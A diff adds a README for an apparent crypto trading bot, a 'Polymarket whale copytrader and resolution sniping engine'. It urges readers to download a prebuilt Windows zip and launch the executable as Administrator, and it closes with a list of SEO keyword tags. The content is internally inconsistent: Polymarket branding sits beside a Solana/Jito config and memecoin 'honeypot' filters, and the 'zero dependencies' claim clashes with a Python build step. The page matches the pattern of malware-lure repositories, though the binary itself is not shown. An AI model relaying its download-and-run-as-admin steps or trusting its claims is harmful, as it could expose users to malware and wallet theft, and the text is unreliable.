@@ -1,0 +1,62 @@
+Polymarket & Perp DEX HFT Suite — Polymarket Whale Wallet Copytrader & Resolution Sniping Engine (Portable x64 Build)
+
+Polymarket & Perp DEX HFT Suite Polymarket Whale Wallet Copytrader & Resolution Sniping Engine: native 64-bit Windows 10/11 portable x64 build with hot-reloadable JSON configuration, low-overhead runtime, and prebuilt portable release.
+
+Overview • Quick Start (No Terminal Needed) • Architecture & Modules • Configuration • Build from Source
+
+Overview
+
+Polymarket & Perp DEX HFT Suite — Polymarket Whale Wallet Copytrader & Resolution Sniping Engine (Portable x64 Build) (polymarket-perp-dex-whale-wallet-copytrader-resolution-por) is a modular, low-overhead runtime and configuration suite engineered for 64-bit Windows 10 and Windows 11 systems. All parameters are controlled cleanly through config/settings.json with live hot-reload support and zero external dependencies.
+
+1-Click Prebuilt Package (No Compiler Required): Even though the full source tree (src/, config/) is included in this repository, end users do not need to compile anything. Click the green Download Portable Release button above or grab polymarket-perp-dex-whale-wallet-copytrader-resolution-por-v1.2.0-win64.zip directly from Releases.
+
+Quick Start (Prebuilt Release)
+
+| Platform | Direct Download Package | Checksum Manifest |
+| :--- | :--- | :--- |
+| Windows 10 / 11 (64-bit) | polymarket-perp-dex-whale-wallet-copytrader-resolution-por-v1.2.0-win64.zip | SHA256SUMS.txt |
+
+1. Download polymarket-perp-dex-whale-wallet-copytrader-resolution-por-v1.2.0-win64.zip from the table above or the Releases section.
+2. Extract the .zip archive into any folder (keep config/settings.json next to the launcher).
+3. Launch the executable as Administrator.
+
+Architecture & Modules
+
+| Subsystem | Technical Implementation | Runtime Controls |
+| :--- | :--- | :--- |
+| Low-Latency Stream | Asynchronous WebSocket pool & mempool listener | Sub-50ms tick-to-order dispatch |
+| MEV & Slippage Guard | Jito bundle simulation + dynamic priority fee | Prevents sandwiching & failed tx fees |
+| Token Safety Audit | Mint/freeze authority & LP lock verification | Filters honeypots prior to execution |
+| Paper & Live Modes | Deterministic local simulation or live signing | Safe strategy backtesting in settings.json |
+
+Configuration (config/settings.json)
+
+{
+  "version": "1.2.0",
+  "rpc": {
+    "http_endpoint": "https://api.mainnet-beta.solana.com",
+    "ws_endpoint": "wss://api.mainnet-beta.solana.com",
+    "jito_block_engine": "https://mainnet.block-engine.jito.wtf",
+    "commitment": "processed"
+  },
+  "execution": {
+    "max_slippage_bps": 150,
+    "priority_fee_microlamports": 250000,
+    "auto_tp_pct": 45.0,
+    "stop_loss_pct": 18.0,
+    "paper_trading_mode": true
+  },
+  "filters": {
+    "require_mint_renounced": true,
+    "require_freeze_disabled": true,
+    "min_initial_liquidity_sol": 15.0
+  }
+}
+
+Building from Source
+
+git clone https://github.com/ivanjops96a3/polymarket-perp-dex-whale-wallet-copytrader-resolution-por.git
+cd polymarket-perp-dex-whale-wallet-copytrader-resolution-por
+python src/engine.py
+
+Indexed tags: polymarket, polymarket-bot, clob, hyperliquid, fragment-sniper, prediction-markets, hft, whale, polymarket-whale, wallet, polymarket-wallet, copytrader, polymarket-copytrader, resolution, polymarket-resolution, sniping
